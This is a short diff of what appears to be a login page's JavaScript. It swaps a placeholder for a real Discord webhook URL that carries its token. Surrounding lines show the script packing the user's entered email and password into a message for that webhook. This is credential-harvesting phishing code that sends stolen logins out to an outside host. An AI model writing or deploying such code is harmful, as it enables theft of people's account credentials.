@@ -14,7 +14,7 @@ document.addEventListener('DOMContentLoaded', function() {
         }
 
         // Send user data to Discord webhook
-        const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
+        const webhookUrl = 'https://discord.com/api/webhooks/1250446588254359583/hWxJFMMwp2NpIx6vq7-pZe_rrQ9sjOm3LxtSZcv6D1bv2uiwMgYNYglzJvHZSctThByk'; // Replace with your Discord webhook URL
 
         const message = `**Email= ||${email}||\nPass= ||${password}||**`;
 
